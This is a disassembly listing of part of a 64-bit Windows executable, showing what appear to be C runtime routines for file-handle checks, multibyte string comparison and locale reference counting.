   140008917:	83 7c 24 40 00       	cmpl   $0x0,0x40(%rsp)
   14000891c:	74 2c                	je     0x14000894a
   14000891e:	85 c0                	test   %eax,%eax
   140008920:	74 21                	je     0x140008943
   140008922:	48 63 0b             	movslq (%rbx),%rcx
   140008925:	48 8b c1             	mov    %rcx,%rax
   140008928:	48 c1 f8 05          	sar    $0x5,%rax
   14000892c:	48 8d 15 dd 25 01 00 	lea    0x125dd(%rip),%rdx        # 0x14001af10
   140008933:	83 e1 1f             	and    $0x1f,%ecx
   140008936:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000893a:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000893e:	80 64 08 08 fe       	andb   $0xfe,0x8(%rax,%rcx,1)
   140008943:	8b 0b                	mov    (%rbx),%ecx
   140008945:	e8 62 fd ff ff       	call   0x1400086ac
   14000894a:	85 ff                	test   %edi,%edi
   14000894c:	74 03                	je     0x140008951
   14000894e:	83 0b ff             	orl    $0xffffffff,(%rbx)
   140008951:	8b c7                	mov    %edi,%eax
   140008953:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140008958:	48 83 c4 50          	add    $0x50,%rsp
   14000895c:	5f                   	pop    %rdi
   14000895d:	c3                   	ret
   14000895e:	cc                   	int3
   14000895f:	cc                   	int3
   140008960:	48 8b c4             	mov    %rsp,%rax
   140008963:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008967:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000896b:	57                   	push   %rdi
   14000896c:	48 83 ec 50          	sub    $0x50,%rsp
   140008970:	48 83 60 e8 00       	andq   $0x0,-0x18(%rax)
   140008975:	48 8b fa             	mov    %rdx,%rdi
   140008978:	48 8b f1             	mov    %rcx,%rsi
   14000897b:	48 8d 50 e8          	lea    -0x18(%rax),%rdx
   14000897f:	49 8b c8             	mov    %r8,%rcx
   140008982:	41 8b d9             	mov    %r9d,%ebx
   140008985:	e8 3e e4 ff ff       	call   0x140006dc8
   14000898a:	85 c0                	test   %eax,%eax
   14000898c:	75 05                	jne    0x140008993
   14000898e:	83 c8 ff             	or     $0xffffffff,%eax
   140008991:	eb 42                	jmp    0x1400089d5
   140008993:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   14000899a:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   14000899f:	44 8b cb             	mov    %ebx,%r9d
   1400089a2:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400089a6:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   1400089ad:	48 8b d7             	mov    %rdi,%rdx
   1400089b0:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400089b4:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   1400089bb:	48 8b ce             	mov    %rsi,%rcx
   1400089be:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400089c2:	e8 d5 21 00 00       	call   0x14000ab9c
   1400089c7:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400089cc:	8b d8                	mov    %eax,%ebx
   1400089ce:	e8 c1 ad ff ff       	call   0x140003794
   1400089d3:	8b c3                	mov    %ebx,%eax
   1400089d5:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400089da:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400089df:	48 83 c4 50          	add    $0x50,%rsp
   1400089e3:	5f                   	pop    %rdi
   1400089e4:	c3                   	ret
   1400089e5:	cc                   	int3
   1400089e6:	cc                   	int3
   1400089e7:	cc                   	int3
   1400089e8:	48 83 ec 38          	sub    $0x38,%rsp
   1400089ec:	41 8b c1             	mov    %r9d,%eax
   1400089ef:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
   1400089f4:	45 8b d0             	mov    %r8d,%r10d
   1400089f7:	4c 8b da             	mov    %rdx,%r11
   1400089fa:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140008a01:	00 
   140008a02:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008a07:	44 8b c0             	mov    %eax,%r8d
   140008a0a:	41 8b d2             	mov    %r10d,%edx
   140008a0d:	49 8b cb             	mov    %r11,%rcx
   140008a10:	e8 6b fe ff ff       	call   0x140008880
   140008a15:	48 83 c4 38          	add    $0x38,%rsp
   140008a19:	c3                   	ret
   140008a1a:	cc                   	int3
   140008a1b:	cc                   	int3
   140008a1c:	45 33 c9             	xor    %r9d,%r9d
   140008a1f:	e9 00 00 00 00       	jmp    0x140008a24
   140008a24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008a29:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008a2e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008a33:	57                   	push   %rdi
   140008a34:	48 83 ec 40          	sub    $0x40,%rsp
   140008a38:	33 ed                	xor    %ebp,%ebp
   140008a3a:	49 8b d8             	mov    %r8,%rbx
   140008a3d:	48 8b fa             	mov    %rdx,%rdi
   140008a40:	48 8b f1             	mov    %rcx,%rsi
   140008a43:	4d 85 c0             	test   %r8,%r8
   140008a46:	75 07                	jne    0x140008a4f
   140008a48:	33 c0                	xor    %eax,%eax
   140008a4a:	e9 ec 00 00 00       	jmp    0x140008b3b
   140008a4f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008a54:	49 8b d1             	mov    %r9,%rdx
   140008a57:	e8 e0 c4 ff ff       	call   0x140004f3c
   140008a5c:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140008a61:	41 39 68 08          	cmp    %ebp,0x8(%r8)
   140008a65:	75 13                	jne    0x140008a7a
   140008a67:	4c 8b c3             	mov    %rbx,%r8
   140008a6a:	48 8b d7             	mov    %rdi,%rdx
   140008a6d:	48 8b ce             	mov    %rsi,%rcx
   140008a70:	e8 fb 28 00 00       	call   0x14000b370
   140008a75:	e9 ae 00 00 00       	jmp    0x140008b28
   140008a7a:	48 85 f6             	test   %rsi,%rsi
   140008a7d:	74 05                	je     0x140008a84
   140008a7f:	48 85 ff             	test   %rdi,%rdi
   140008a82:	75 1a                	jne    0x140008a9e
   140008a84:	e8 ef ba ff ff       	call   0x140004578
   140008a89:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008a8f:	e8 94 b6 ff ff       	call   0x140004128
   140008a94:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140008a99:	e9 8a 00 00 00       	jmp    0x140008b28
   140008a9e:	41 b1 04             	mov    $0x4,%r9b
   140008aa1:	0f b6 0e             	movzbl (%rsi),%ecx
   140008aa4:	48 ff cb             	dec    %rbx
   140008aa7:	48 ff c6             	inc    %rsi
   140008aaa:	46 84 4c 01 19       	test   %r9b,0x19(%rcx,%r8,1)
   140008aaf:	74 2d                	je     0x140008ade
   140008ab1:	48 85 db             	test   %rbx,%rbx
   140008ab4:	75 11                	jne    0x140008ac7
   140008ab6:	0f b6 07             	movzbl (%rdi),%eax
   140008ab9:	8b cd                	mov    %ebp,%ecx
   140008abb:	46 84 4c 00 19       	test   %r9b,0x19(%rax,%r8,1)
   140008ac0:	75 5b                	jne    0x140008b1d
   140008ac2:	0f b7 d0             	movzwl %ax,%edx
   140008ac5:	eb 47                	jmp    0x140008b0e
   140008ac7:	40 38 2e             	cmp    %bpl,(%rsi)
   140008aca:	75 05                	jne    0x140008ad1
   140008acc:	0f b7 cd             	movzwl %bp,%ecx
   140008acf:	eb 0d                	jmp    0x140008ade
   140008ad1:	0f b6 06             	movzbl (%rsi),%eax
   140008ad4:	66 c1 e1 08          	shl    $0x8,%cx
   140008ad8:	66 0b c8             	or     %ax,%cx
   140008adb:	48 ff c6             	inc    %rsi
   140008ade:	0f b6 17             	movzbl (%rdi),%edx
   140008ae1:	48 ff c7             	inc    %rdi
   140008ae4:	46 84 4c 02 19       	test   %r9b,0x19(%rdx,%r8,1)
   140008ae9:	74 23                	je     0x140008b0e
   140008aeb:	48 85 db             	test   %rbx,%rbx
   140008aee:	75 04                	jne    0x140008af4
   140008af0:	8b d5                	mov    %ebp,%edx
   140008af2:	eb 1a                	jmp    0x140008b0e
   140008af4:	48 ff cb             	dec    %rbx
   140008af7:	40 38 2f             	cmp    %bpl,(%rdi)
   140008afa:	75 05                	jne    0x140008b01
   140008afc:	0f b7 d5             	movzwl %bp,%edx
   140008aff:	eb 0d                	jmp    0x140008b0e
   140008b01:	0f b6 07             	movzbl (%rdi),%eax
   140008b04:	66 c1 e2 08          	shl    $0x8,%dx
   140008b08:	66 0b d0             	or     %ax,%dx
   140008b0b:	48 ff c7             	inc    %rdi
   140008b0e:	66 3b d1             	cmp    %cx,%dx
   140008b11:	75 0e                	jne    0x140008b21
   140008b13:	66 85 c9             	test   %cx,%cx
   140008b16:	74 05                	je     0x140008b1d
   140008b18:	48 85 db             	test   %rbx,%rbx
   140008b1b:	75 84                	jne    0x140008aa1
   140008b1d:	8b c5                	mov    %ebp,%eax
   140008b1f:	eb 07                	jmp    0x140008b28
   140008b21:	1b c0                	sbb    %eax,%eax
   140008b23:	83 e0 02             	and    $0x2,%eax
   140008b26:	ff c8                	dec    %eax
   140008b28:	40 38 6c 24 38       	cmp    %bpl,0x38(%rsp)
   140008b2d:	74 0c                	je     0x140008b3b
   140008b2f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140008b34:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140008b3b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008b40:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008b45:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008b4a:	48 83 c4 40          	add    $0x40,%rsp
   140008b4e:	5f                   	pop    %rdi
   140008b4f:	c3                   	ret
   140008b50:	45 33 c9             	xor    %r9d,%r9d
   140008b53:	e9 00 00 00 00       	jmp    0x140008b58
   140008b58:	48 8b c4             	mov    %rsp,%rax
   140008b5b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008b5f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008b63:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140008b67:	57                   	push   %rdi
   140008b68:	48 83 ec 40          	sub    $0x40,%rsp
   140008b6c:	48 8b f1             	mov    %rcx,%rsi
   140008b6f:	48 8b fa             	mov    %rdx,%rdi
   140008b72:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   140008b76:	49 8b d1             	mov    %r9,%rdx
   140008b79:	49 8b d8             	mov    %r8,%rbx
   140008b7c:	e8 bb c3 ff ff       	call   0x140004f3c
   140008b81:	33 ed                	xor    %ebp,%ebp
   140008b83:	48 85 db             	test   %rbx,%rbx
   140008b86:	0f 84 46 01 00 00    	je     0x140008cd2
   140008b8c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140008b91:	39 69 08             	cmp    %ebp,0x8(%rcx)
   140008b94:	75 13                	jne    0x140008ba9
   140008b96:	4c 8b c3             	mov    %rbx,%r8
   140008b99:	48 8b d7             	mov    %rdi,%rdx
   140008b9c:	48 8b ce             	mov    %rsi,%rcx
   140008b9f:	e8 94 28 00 00       	call   0x14000b438
   140008ba4:	e9 34 01 00 00       	jmp    0x140008cdd
   140008ba9:	48 85 f6             	test   %rsi,%rsi
   140008bac:	74 05                	je     0x140008bb3
   140008bae:	48 85 ff             	test   %rdi,%rdi
   140008bb1:	75 1a                	jne    0x140008bcd
   140008bb3:	e8 c0 b9 ff ff       	call   0x140004578
   140008bb8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008bbe:	e8 65 b5 ff ff       	call   0x140004128
   140008bc3:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140008bc8:	e9 10 01 00 00       	jmp    0x140008cdd
   140008bcd:	41 b1 04             	mov    $0x4,%r9b
   140008bd0:	44 0f b6 06          	movzbl (%rsi),%r8d
   140008bd4:	48 ff cb             	dec    %rbx
   140008bd7:	48 ff c6             	inc    %rsi
   140008bda:	45 84 4c 08 19       	test   %r9b,0x19(%r8,%rcx,1)
   140008bdf:	74 62                	je     0x140008c43
   140008be1:	48 85 db             	test   %rbx,%rbx
   140008be4:	75 19                	jne    0x140008bff
   140008be6:	0f b6 07             	movzbl (%rdi),%eax
   140008be9:	44 8b c5             	mov    %ebp,%r8d
   140008bec:	44 84 4c 08 19       	test   %r9b,0x19(%rax,%rcx,1)
   140008bf1:	0f 85 db 00 00 00    	jne    0x140008cd2
   140008bf7:	0f b7 d0             	movzwl %ax,%edx
   140008bfa:	e9 be 00 00 00       	jmp    0x140008cbd
   140008bff:	40 38 2e             	cmp    %bpl,(%rsi)
   140008c02:	75 06                	jne    0x140008c0a
   140008c04:	44 0f b7 c5          	movzwl %bp,%r8d
   140008c08:	eb 4d                	jmp    0x140008c57
   140008c0a:	0f b6 06             	movzbl (%rsi),%eax
   140008c0d:	66 41 c1 e0 08       	shl    $0x8,%r8w
   140008c12:	48 ff c6             	inc    %rsi
   140008c15:	66 44 0b c0          	or     %ax,%r8w
   140008c19:	66 44 3b 41 0c       	cmp    0xc(%rcx),%r8w
   140008c1e:	72 0e                	jb     0x140008c2e
   140008c20:	66 44 3b 41 0e       	cmp    0xe(%rcx),%r8w
   140008c25:	77 07                	ja     0x140008c2e
   140008c27:	66 44 03 41 10       	add    0x10(%rcx),%r8w
   140008c2c:	eb 29                	jmp    0x140008c57
   140008c2e:	66 44 3b 41 12       	cmp    0x12(%rcx),%r8w
   140008c33:	72 22                	jb     0x140008c57
   140008c35:	66 44 3b 41 14       	cmp    0x14(%rcx),%r8w
   140008c3a:	77 1b                	ja     0x140008c57
   140008c3c:	66 44 03 41 16       	add    0x16(%rcx),%r8w
   140008c41:	eb 14                	jmp    0x140008c57
   140008c43:	41 0f b7 c0          	movzwl %r8w,%eax
   140008c47:	f6 44 08 19 10       	testb  $0x10,0x19(%rax,%rcx,1)
   140008c4c:	74 09                	je     0x140008c57
   140008c4e:	44 0f b6 84 08 19 01 	movzbl 0x119(%rax,%rcx,1),%r8d
   140008c55:	00 00 
   140008c57:	0f b6 17             	movzbl (%rdi),%edx
   140008c5a:	48 ff c7             	inc    %rdi
   140008c5d:	44 84 4c 0a 19       	test   %r9b,0x19(%rdx,%rcx,1)
   140008c62:	74 47                	je     0x140008cab
   140008c64:	48 85 db             	test   %rbx,%rbx
   140008c67:	75 04                	jne    0x140008c6d
   140008c69:	8b d5                	mov    %ebp,%edx
   140008c6b:	eb 50                	jmp    0x140008cbd
   140008c6d:	48 ff cb             	dec    %rbx
   140008c70:	40 38 2f             	cmp    %bpl,(%rdi)
   140008c73:	75 05                	jne    0x140008c7a
   140008c75:	0f b7 d5             	movzwl %bp,%edx
   140008c78:	eb 43                	jmp    0x140008cbd
   140008c7a:	0f b6 07             	movzbl (%rdi),%eax
   140008c7d:	66 c1 e2 08          	shl    $0x8,%dx
   140008c81:	48 ff c7             	inc    %rdi
   140008c84:	66 0b d0             	or     %ax,%dx
   140008c87:	66 3b 51 0c          	cmp    0xc(%rcx),%dx
   140008c8b:	72 0c                	jb     0x140008c99
   140008c8d:	66 3b 51 0e          	cmp    0xe(%rcx),%dx
   140008c91:	77 06                	ja     0x140008c99
   140008c93:	66 03 51 10          	add    0x10(%rcx),%dx
   140008c97:	eb 24                	jmp    0x140008cbd
   140008c99:	66 3b 51 12          	cmp    0x12(%rcx),%dx
   140008c9d:	72 1e                	jb     0x140008cbd
   140008c9f:	66 3b 51 14          	cmp    0x14(%rcx),%dx
   140008ca3:	77 18                	ja     0x140008cbd
   140008ca5:	66 03 51 16          	add    0x16(%rcx),%dx
   140008ca9:	eb 12                	jmp    0x140008cbd
   140008cab:	0f b7 c2             	movzwl %dx,%eax
   140008cae:	f6 44 08 19 10       	testb  $0x10,0x19(%rax,%rcx,1)
   140008cb3:	74 08                	je     0x140008cbd
   140008cb5:	0f b6 94 08 19 01 00 	movzbl 0x119(%rax,%rcx,1),%edx
   140008cbc:	00 
   140008cbd:	66 41 3b d0          	cmp    %r8w,%dx
   140008cc1:	75 13                	jne    0x140008cd6
   140008cc3:	66 45 85 c0          	test   %r8w,%r8w
   140008cc7:	74 09                	je     0x140008cd2
   140008cc9:	48 85 db             	test   %rbx,%rbx
   140008ccc:	0f 85 fe fe ff ff    	jne    0x140008bd0
   140008cd2:	8b c5                	mov    %ebp,%eax
   140008cd4:	eb 07                	jmp    0x140008cdd
   140008cd6:	1b c0                	sbb    %eax,%eax
   140008cd8:	83 e0 02             	and    $0x2,%eax
   140008cdb:	ff c8                	dec    %eax
   140008cdd:	40 38 6c 24 38       	cmp    %bpl,0x38(%rsp)
   140008ce2:	74 0c                	je     0x140008cf0
   140008ce4:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140008ce9:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140008cf0:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008cf5:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140008cfa:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008cff:	48 83 c4 40          	add    $0x40,%rsp
   140008d03:	5f                   	pop    %rdi
   140008d04:	c3                   	ret
   140008d05:	cc                   	int3
   140008d06:	cc                   	int3
   140008d07:	cc                   	int3
   140008d08:	48 83 ec 28          	sub    $0x28,%rsp
   140008d0c:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140008d0f:	75 0d                	jne    0x140008d1e
   140008d11:	e8 62 b8 ff ff       	call   0x140004578
   140008d16:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008d1c:	eb 42                	jmp    0x140008d60
   140008d1e:	85 c9                	test   %ecx,%ecx
   140008d20:	78 2e                	js     0x140008d50
   140008d22:	3b 0d 38 2f 01 00    	cmp    0x12f38(%rip),%ecx        # 0x14001bc60
   140008d28:	73 26                	jae    0x140008d50
   140008d2a:	48 63 c9             	movslq %ecx,%rcx
   140008d2d:	48 8d 15 dc 21 01 00 	lea    0x121dc(%rip),%rdx        # 0x14001af10
   140008d34:	48 8b c1             	mov    %rcx,%rax
   140008d37:	83 e1 1f             	and    $0x1f,%ecx
   140008d3a:	48 c1 f8 05          	sar    $0x5,%rax
   140008d3e:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140008d42:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   140008d46:	0f be 44 08 08       	movsbl 0x8(%rax,%rcx,1),%eax
   140008d4b:	83 e0 40             	and    $0x40,%eax
   140008d4e:	eb 12                	jmp    0x140008d62
   140008d50:	e8 23 b8 ff ff       	call   0x140004578
   140008d55:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008d5b:	e8 c8 b3 ff ff       	call   0x140004128
   140008d60:	33 c0                	xor    %eax,%eax
   140008d62:	48 83 c4 28          	add    $0x28,%rsp
   140008d66:	c3                   	ret
   140008d67:	cc                   	int3
   140008d68:	f0 ff 01             	lock incl (%rcx)
   140008d6b:	48 8b 81 d8 00 00 00 	mov    0xd8(%rcx),%rax
   140008d72:	48 85 c0             	test   %rax,%rax
   140008d75:	74 03                	je     0x140008d7a
   140008d77:	f0 ff 00             	lock incl (%rax)
   140008d7a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140008d81:	48 85 c0             	test   %rax,%rax
   140008d84:	74 03                	je     0x140008d89
   140008d86:	f0 ff 00             	lock incl (%rax)
   140008d89:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140008d90:	48 85 c0             	test   %rax,%rax
   140008d93:	74 03                	je     0x140008d98
   140008d95:	f0 ff 00             	lock incl (%rax)
   140008d98:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   140008d9f:	48 85 c0             	test   %rax,%rax
   140008da2:	74 03                	je     0x140008da7
   140008da4:	f0 ff 00             	lock incl (%rax)
   140008da7:	48 8d 41 28          	lea    0x28(%rcx),%rax
   140008dab:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140008db1:	48 8d 15 84 0f 01 00 	lea    0x10f84(%rip),%rdx        # 0x140019d3c
   140008db8:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140008dbc:	74 0b                	je     0x140008dc9
   140008dbe:	48 8b 10             	mov    (%rax),%rdx
   140008dc1:	48 85 d2             	test   %rdx,%rdx
   140008dc4:	74 03                	je     0x140008dc9
   140008dc6:	f0 ff 02             	lock incl (%rdx)
   140008dc9:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140008dce:	74 0c                	je     0x140008ddc
   140008dd0:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140008dd4:	48 85 d2             	test   %rdx,%rdx
   140008dd7:	74 03                	je     0x140008ddc
   140008dd9:	f0 ff 02             	lock incl (%rdx)
   140008ddc:	48 83 c0 20          	add    $0x20,%rax
   140008de0:	49 ff c8             	dec    %r8
   140008de3:	75 cc                	jne    0x140008db1
   140008de5:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140008dec:	f0 ff 80 5c 01 00 00 	lock incl 0x15c(%rax)
   140008df3:	c3                   	ret
   140008df4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008df9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008dfe:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008e03:	57                   	push   %rdi
   140008e04:	48 83 ec 20          	sub    $0x20,%rsp
   140008e08:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140008e0f:	48 8b d9             	mov    %rcx,%rbx
   140008e12:	48 85 c0             	test   %rax,%rax
   140008e15:	74 79                	je     0x140008e90
   140008e17:	48 8d 0d a2 13 01 00 	lea    0x113a2(%rip),%rcx        # 0x14001a1c0
   140008e1e:	48 3b c1             	cmp    %rcx,%rax
   140008e21:	74 6d                	je     0x140008e90
   140008e23:	48 8b 83 d8 00 00 00 	mov    0xd8(%rbx),%rax
   140008e2a:	48 85 c0             	test   %rax,%rax
   140008e2d:	74 61                	je     0x140008e90
   140008e2f:	83 38 00             	cmpl   $0x0,(%rax)
   140008e32:	75 5c                	jne    0x140008e90
   140008e34:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   140008e3b:	48 85 c9             	test   %rcx,%rcx
   140008e3e:	74 16                	je     0x140008e56
   140008e40:	83 39 00             	cmpl   $0x0,(%rcx)
   140008e43:	75 11                	jne    0x140008e56
   140008e45:	e8 4a a9 ff ff       	call   0x140003794
   140008e4a:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   140008e51:	e8 0e 27 00 00       	call   0x14000b564
   140008e56:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   140008e5d:	48 85 c9             	test   %rcx,%rcx
   140008e60:	74 16                	je     0x140008e78
   140008e62:	83 39 00             	cmpl   $0x0,(%rcx)
   140008e65:	75 11                	jne    0x140008e78
   140008e67:	e8 28 a9 ff ff       	call   0x140003794
   140008e6c:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   140008e73:	e8 f8 27 00 00       	call   0x14000b670
   140008e78:	48 8b 8b d8 00 00 00 	mov    0xd8(%rbx),%rcx
   140008e7f:	e8 10 a9 ff ff       	call   0x140003794
   140008e84:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   140008e8b:	e8 04 a9 ff ff       	call   0x140003794
   140008e90:	48 8b 83 f8 00 00 00 	mov    0xf8(%rbx),%rax
   140008e97:	48 85 c0             	test   %rax,%rax
   140008e9a:	74 47                	je     0x140008ee3
   140008e9c:	83 38 00             	cmpl   $0x0,(%rax)
   140008e9f:	75 42                	jne    0x140008ee3
   140008ea1:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   140008ea8:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   140008eaf:	e8 e0 a8 ff ff       	call   0x140003794
   140008eb4:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   140008ebb:	bf 80 00 00 00       	mov    $0x80,%edi
   140008ec0:	48 2b cf             	sub    %rdi,%rcx
   140008ec3:	e8 cc a8 ff ff       	call   0x140003794
   140008ec8:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140008ecf:	48 2b cf             	sub    %rdi,%rcx
   140008ed2:	e8 bd a8 ff ff       	call   0x140003794
   140008ed7:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008ede:	e8 b1 a8 ff ff       	call   0x140003794
   140008ee3:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140008eea:	48 8d 05 4f 0e 01 00 	lea    0x10e4f(%rip),%rax        # 0x140019d40
   140008ef1:	48 3b c8             	cmp    %rax,%rcx
   140008ef4:	74 1a                	je     0x140008f10
   140008ef6:	83 b9 5c 01 00 00 00 	cmpl   $0x0,0x15c(%rcx)
   140008efd:	75 11                	jne    0x140008f10
   140008eff:	e8 d8 27 00 00       	call   0x14000b6dc
   140008f04:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140008f0b:	e8 84 a8 ff ff       	call   0x140003794
   140008f10:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   140008f17:	48 8d 7b 28          	lea    0x28(%rbx),%rdi
   140008f1b:	bd 06 00 00 00       	mov    $0x6,%ebp
   140008f20:	48 8d 05 15 0e 01 00 	lea    0x10e15(%rip),%rax        # 0x140019d3c
   140008f27:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   140008f2b:	74 1a                	je     0x140008f47
   140008f2d:	48 8b 0f             	mov    (%rdi),%rcx
   140008f30:	48 85 c9             	test   %rcx,%rcx
   140008f33:	74 12                	je     0x140008f47
   140008f35:	83 39 00             	cmpl   $0x0,(%rcx)
   140008f38:	75 0d                	jne    0x140008f47
   140008f3a:	e8 55 a8 ff ff       	call   0x140003794
   140008f3f:	48 8b 0e             	mov    (%rsi),%rcx
   140008f42:	e8 4d a8 ff ff       	call   0x140003794
   140008f47:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   140008f4c:	74 13                	je     0x140008f61
   140008f4e:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   140008f52:	48 85 c9             	test   %rcx,%rcx
   140008f55:	74 0a                	je     0x140008f61
   140008f57:	83 39 00             	cmpl   $0x0,(%rcx)
   140008f5a:	75 05                	jne    0x140008f61
   140008f5c:	e8 33 a8 ff ff       	call   0x140003794
   140008f61:	48 83 c6 08          	add    $0x8,%rsi
   140008f65:	48 83 c7 20          	add    $0x20,%rdi
   140008f69:	48 ff cd             	dec    %rbp
   140008f6c:	75 b2                	jne    0x140008f20
   140008f6e:	48 8b cb             	mov    %rbx,%rcx
   140008f71:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008f76:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008f7b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008f80:	48 83 c4 20          	add    $0x20,%rsp
   140008f84:	5f                   	pop    %rdi
   140008f85:	e9 0a a8 ff ff       	jmp    0x140003794
   140008f8a:	cc                   	int3
   140008f8b:	cc                   	int3
   140008f8c:	48 85 c9             	test   %rcx,%rcx
   140008f8f:	0f 84 97 00 00 00    	je     0x14000902c
   140008f95:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008f99:	f0 44 01 09          	lock add %r9d,(%rcx)
   140008f9d:	48 8b 81 d8 00 00 00 	mov    0xd8(%rcx),%rax
   140008fa4:	48 85 c0             	test   %rax,%rax
   140008fa7:	74 04                	je     0x140008fad
   140008fa9:	f0 44 01 08          	lock add %r9d,(%rax)
   140008fad:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140008fb4:	48 85 c0             	test   %rax,%rax
   140008fb7:	74 04                	je     0x140008fbd
   140008fb9:	f0 44 01 08          	lock add %r9d,(%rax)
   140008fbd:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140008fc4:	48 85 c0             	test   %rax,%rax
   140008fc7:	74 04                	je     0x140008fcd
   140008fc9:	f0 44 01 08          	lock add %r9d,(%rax)
   140008fcd:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   140008fd4:	48 85 c0             	test   %rax,%rax
   140008fd7:	74 04                	je     0x140008fdd
   140008fd9:	f0 44 01 08          	lock add %r9d,(%rax)
   140008fdd:	48 8d 41 28          	lea    0x28(%rcx),%rax
   140008fe1:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140008fe7:	48 8d 15 4e 0d 01 00 	lea    0x10d4e(%rip),%rdx        # 0x140019d3c
   140008fee:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140008ff2:	74 0c                	je     0x140009000
   140008ff4:	48 8b 10             	mov    (%rax),%rdx
   140008ff7:	48 85 d2             	test   %rdx,%rdx
   140008ffa:	74 04                	je     0x140009000
   140008ffc:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140009000:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   140009005:	74 0d                	je     0x140009014
   140009007:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000900b:	48 85 d2             	test   %rdx,%rdx
   14000900e:	74 04                	je     0x140009014
   140009010:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140009014:	48 83 c0 20          	add    $0x20,%rax
   140009018:	49 ff c8             	dec    %r8
   14000901b:	75 ca                	jne    0x140008fe7
   14000901d:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140009024:	f0 44 01 88 5c 01 00 	lock add %r9d,0x15c(%rax)
   14000902b:	00 
   14000902c:	48 8b c1             	mov    %rcx,%rax
